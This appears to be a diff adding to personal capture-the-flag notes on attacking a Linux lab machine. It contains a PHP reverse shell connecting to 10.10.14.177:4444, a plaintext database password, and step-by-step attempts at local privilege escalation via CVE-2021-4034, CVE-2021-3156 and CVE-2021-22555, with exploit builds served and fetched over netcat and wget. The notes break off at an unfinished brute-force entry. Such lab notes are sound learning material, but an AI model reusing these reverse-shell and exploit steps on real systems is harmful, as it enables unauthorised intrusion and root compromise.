@@ -106,4 +106,97 @@ And visit it...
 ```bash
 try get a better shell
 
+<?php
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.177/4444 0>&1'");
+
+nc -lvp 4444
+```
+
+```bash
+mysql -u lewis -pP4ntherg0t1n5r3c0n## -e 'SELECT User, Host, authentication_string FROM mysql.user;'
+ERROR 1142 (42000) at line 1: SELECT command denied to user 'lewis'@'localhost' for table 'user'
+Cant get more users and passwords...
+```
+
+```bash
+lsb_release -a
+No LSB modules are available.
+Distributor ID:	Ubuntu
+Description:	Ubuntu 20.04.6 LTS
+Release:	20.04
+Codename:	focal
+```
+
+```bash
+Try LinEnum, Linux Exploit Suggester, Linux Priv Checker, Linux Smart Enumeration, LinPeas
+
+Outputs: LinEnum.txt, les.txt, lse.txt, linpeas.txt
+https://ed4m4s.blog/privilege-escalation/linux/linprivesc
+```
+
+```bash
+les.txt - CVE-2021-4034
+	Get glibc version
+	ldd --version
+
+	git clone https://github.com/berdav/CVE-2021-4034
+	cd CVE-2021-4034
+	zig cc -target x86_64-linux-gnu.2.31 -Wall --shared -fPIC -o pwnkit.so pwnkit.c
+	{ echo -ne "HTTP/1.0 200 OK\r\nContent-Length: $(wc -c <pwnkit.so)\r\n\r\n"; cat pwnkit.so; } | nc -l 4445
+
+	wget "http://10.10.14.177:4445"
+	mv index.html pwnkit.so
+
+	zig cc -target x86_64-linux-gnu.2.31 -Wall    cve-2021-4034.c   -o cve-2021-4034
+	{ echo -ne "HTTP/1.0 200 OK\r\nContent-Length: $(wc -c <cve-2021-4034)\r\n\r\n"; cat cve-2021-4034; } | nc -l 4445
+
+	wget "http://10.10.14.177:4445"
+	mv index.html cve-2021-4034
+	echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
+	mkdir -p GCONV_PATH=.
+	cp /usr/bin/true GCONV_PATH=./pwnkit.so:.
+	chmod +x cve-2021-4034
+	./cve-2021-4034
+
+	GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”
+
+```
+
+```bash
+les.txt - CVE-2021-3156
+	https://github.com/blasty/CVE-2021-3156
+
+	GNU parallel not installed
+
+	https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py	
+
+	AssertionError: target is patched
+```
+
+```bash
+les.txt - CVE-2021-22555
+	wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+	zig cc -target x86_64-linux-gnu.2.31 exploit.c
+	{ echo -ne "HTTP/1.0 200 OK\r\nContent-Length: $(wc -c <exploit)\r\n\r\n"; cat exploit; } | nc -l 4445
+
+	wget "http://10.10.14.177:4445"
+	mv index.html exploit
+	chmod +x exploit
+	./exploit
+
+	[-] unshare(CLONE_NEWUSER): Operation not permitted
+
+```
+
+```bash
+linpeas.txt - sudo = 1.8.31
+	https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
+```
+
+```bash
+	Brute force hash ?
+
+	
 ```
